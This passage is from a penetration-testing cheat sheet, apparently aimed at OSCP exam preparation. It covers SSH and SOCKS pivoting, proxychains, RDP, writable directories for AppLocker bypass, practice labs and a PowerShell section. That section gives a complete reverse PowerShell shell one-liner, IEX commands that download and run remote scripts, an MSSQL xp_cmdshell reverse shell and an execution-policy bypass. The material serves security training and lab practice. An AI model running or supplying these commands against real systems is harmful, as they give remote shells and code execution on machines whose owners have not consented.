ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" \
  -i /path/to/id_rsa kali@KALI_IP
```

**5. Configure proxychains** (`/etc/proxychains.conf`):

```
socks4 127.0.0.1 1080
```

**6. Use proxychains** (TCP Connect scans only with nmap):

```bash
sudo proxychains nmap -sT -p80 -sC -sV --open -Pn -n 10.10.10.10
```

**Quick SSH Tunnels:**

```bash
# Remote port forward
ssh user@10.10.10.10 -R 1234:127.0.0.1:1234

# Dynamic SOCKS proxy
ssh -D 1337 -q -C -N -f user@10.10.10.10
```

### SOCKS Proxy (PowerShell)

```powershell
# 1. Configure proxychains
# vi /etc/proxychains.conf -> socks5 <ip> 9080

# 2. Import and start the proxy
Import-Module .\Invoke-SocksProxy.psm1
Invoke-SocksProxy -bindPort 9080

# 3. Use it
# proxychains nmap -sT <ip>
```

### sshuttle

```bash
sshuttle -r user@10.10.10.10 10.1.1.0/24
```

### Remote Desktop

```bash
rdesktop -u user -p password 10.10.10.10 -g 85% -r disk:share=/root/
xfreerdp /d:domain.local /u:username /p:password /v:10.10.10.10 /cert-ignore
```

---

## Useful References

### Web Servers (Quick Setup)

```bash
python -m SimpleHTTPServer 80       # Python 2
python3 -m http.server 80           # Python 3
php -S 0.0.0.0:80                   # PHP
ngrok http 80                       # ngrok
```

### Breakouts / Environment Escapes

- [Pentest Partners - Breaking out of Citrix](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
- [SRA.io - SiteKiosk Breakout](https://sra.io/blog/sitekiosk-breakout/)
- [TrustedSec - Kiosk/POS Breakout Keys](https://www.trustedsec.com/blog/kioskpos-breakout-keys-in-windows/)
- [NCC Group - Environment Breakout Issues (PDF)](https://research.nccgroup.com/wp-content/uploads/2020/07/research-insights_common-issues-with-environment-breakouts.pdf)
- [GracefulSecurity - Citrix Breakout](https://gracefulsecurity.com/citrix-breakout/)
- [NetSPI - Breaking out of Applications](https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/)

### Writeable Directories

#### Windows

Default writable directories for normal users (varies by OS version):

```
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

Source: [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)

#### Linux

```bash
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
```

### Metasploit Tips

#### Adding Custom Modules

- [How to Add a Module to Metasploit from Exploit-DB](https://medium.com/@pentest_it/how-to-add-a-module-to-metasploit-from-exploit-db-d389c2a33f6d)

### Nmap Automation Script

Scan multiple IPs with organized output (included in this repo as `automap.sh`):

```bash
#!/bin/bash
for line in $(cat ip.txt); do
    mkdir -p $line/screenshots
    nmap -sC -sV -p- -o ./$line/Full-TCP $line -Pn --min-rate 2000
done
```

### Labs & Practice

| Category | Lab | URL |
|---|---|---|
| Terminal Skills | OverTheWire Bandit | https://overthewire.org/wargames/bandit/ |
| Web Hacking | OverTheWire Natas | https://overthewire.org/wargames/natas/ |
| XSS | Google XSS Game | https://xss-game.appspot.com/ |
| XSS | PwnFunction XSS Labs | https://xss.pwnfunction.com/ |
| XSS | PortSwigger XSS Labs | https://portswigger.net/web-security/cross-site-scripting |
| XSS | alert(1) to win | http://alf.nu/alert1 |

### Windows Framework / PowerShell

#### Bypass Execution Policy

```powershell
powershell -ExecutionPolicy ByPass -File script.ps1
```

#### Reverse PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Load Remote Scripts

```powershell
# PowerUp
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:80/PowerUp.ps1') | powershell -noprofile -

# Generic
powershell -nop -exec bypass IEX "(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Script.ps1'); Invoke-Script"
```

#### Reverse Shell via MSSQL

```sql
xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\"http://10.10.10.10/Nishang-ReverseShell.ps1\")
```

#### File Transfer with PowerShell

```powershell
powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/file', 'file')
```

**Resources:**

- [Nishang](https://github.com/samratashok/nishang) - PowerShell offensive framework
- [Sherlock](https://github.com/rasta-mouse/Sherlock) - PowerShell priv esc finder (deprecated, use Watson)

---

## Thank You

Thanks to these people for including my cheatsheet on their website/blog:

- [KhaoticDev Cheatsheets](https://khaoticdev.net/cheatsheets/#collections)
- [NCyberSec Facebook Post](https://www.facebook.com/ncybersec/posts/1541830509321001)
- [CyberG0100 Facebook Post](https://www.facebook.com/cyberg0100/posts/github-sinfulzjusttryharder-justtryharder-a-cheat-sheet-which-will-aid-you-throu/653235345249466)
- [r/CyberSpaceVN Reddit Post](https://www.reddit.com/r/CyberSpaceVN/comments/f3n2wp/github_sinfulzjusttryharder_justtryharder_a_cheat)
- [XN4K PWK Cheatsheet](https://xn4k.github.io/pentest/PWK-course-&-the-OSCP-Exam-Cheatsheet/)
- [OpenSourceLibs Pentesting Tools](https://opensourcelibs.com/libs/pentesting-tools)
- [BugBountyTips Blog](https://www.bugbountytips.tech/2020/08/23/justtryharderpwk-cheatsheetkali-linux-cheatsheethydra-cheatsheetsecu-2/)
- [PythonLang OSCP Category](https://pythonlang.dev/category/oscp/)
